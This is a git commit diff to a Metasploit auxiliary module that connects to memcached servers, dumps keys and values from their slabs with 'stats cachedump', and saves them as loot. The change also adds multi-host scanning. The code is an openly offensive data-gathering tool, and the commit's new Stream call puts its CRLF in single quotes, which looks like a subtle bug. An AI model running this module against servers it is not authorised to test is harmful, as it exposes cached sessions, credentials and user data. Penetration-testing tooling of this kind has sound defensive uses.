96c12490203377ae4dac01efa485d5b25818b1a7
pdeardorff-r7 <paul_deardorff@rapid7.com>
2015-01-17 09:13:02 -0800

    add a memcached cmd stream

--- modules/auxiliary/gather/memcached_extractor.rb
+++ modules/auxiliary/gather/memcached_extractor.rb
@@ -7,6 +7,7 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
+  include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
@@ -16,21 +17,41 @@ class Metasploit3 < Msf::Auxiliary
         This module extracts the slabs from a memcached instance.  It then
         finds the keys and values stored in those slabs.
       ),
-      'Author'       => [ 'Paul Deardorff <paul_deardorff[at]rapid7.com>' ],
-      'License'      => MSF_LICENSE
+      'Author'        => [ 'Paul Deardorff <paul_deardorff[at]rapid7.com>' ],
+      'License'       => MSF_LICENSE
     ))
 
     register_options(
       [
-        Opt::RPORT(11211)
+        Opt::RPORT(11211),
+        OptInt.new('MAXKEYS', [ true, 'Maximum number of keys to be pulled from a slab', 100] )
       ], self.class)
+  end
+
+  def max_keys
+    datastore['MAXKEYS'].to_i
+  end
+
+  class Stream
+    def initialize(sock, cmd)
+      @sock = sock
+      @sock.send(cmd, 0)
+    end
+    def each
+      loop do
+        data = @sock.recv(4096)
+        break if !data || data.length == 0
+        yield data
+        break if data =~ /^END/
+      end
+    end
   end
 
   # Returns array of keys for all slabs
   def enumerate_keys
     keys = []
     enumerate_slab_ids.each do |sid|
-      sock.send("stats cachedump #{sid} 100\r\n", 0)
+      sock.send("stats cachedump #{sid} #{max_keys}\r\n", 0)
       data = sock.recv(4096)
       matches = /^ITEM (?<key>.*) \[/.match(data)
       keys << matches[:key] if matches
@@ -40,14 +61,10 @@ class Metasploit3 < Msf::Auxiliary
 
   # Returns array of slab ids as strings
   def enumerate_slab_ids
-    sock.send("stats slabs\r\n", 0)
     slab_ids = []
-    loop do
-      data = sock.recv(4096)
-      break if !data || data.length == 0
+    Stream.new(sock, 'stats slabs\r\n').each do |data|
       matches = data.scan(/^STAT (?<slab_id>(\d)*):/)
       slab_ids << matches
-      break if data =~ /^END/
     end
     slab_ids.flatten!
     slab_ids.uniq! || []
@@ -76,17 +93,27 @@ class Metasploit3 < Msf::Auxiliary
     matches[:version] || 'unkown version'
   end
 
-  def run
-    print_status("#{rhost}:#{rport} - Connecting to memcached server...")
+  def run_host(ip)
+    print_status("#{ip}:#{rport} - Connecting to memcached server...")
     begin
       connect
       print_good("Connected to memcached #{determine_version}")
       keys = enumerate_keys
       print_good("Found #{keys.size} keys")
       data = data_for_keys(keys)
-      rhost = 'localhost.memcached' if %w(localhost 127.0.0.1).include?(rhost)
-      store_loot('memcached.dump', 'text/plain', rhost, data, 'memcached.txt', 'Memcached extractor')
-      print_good("Loot stored!")
+      if %w(localhost 127.0.0.1).include?(ip)
+        result_table = Rex::Ui::Text::Table.new(
+          'Header'  => "Keys/Values found for #{ip}:#{rport}",
+          'Indent'  => 1,
+          'Columns' => [ 'Key', 'Value' ]
+        )
+        data.take(10).each { |r| result_table << r }
+        print_line
+        print_line("#{result_table}")
+      else
+        store_loot('memcached.dump', 'text/plain', ip, data, 'memcached.txt', 'Memcached extractor')
+        print_good("Loot stored!")
+      end
     rescue Rex::ConnectionRefused, Rex::ConnectionTimeout
       print_error("Could not connect to memcached server!")
     end
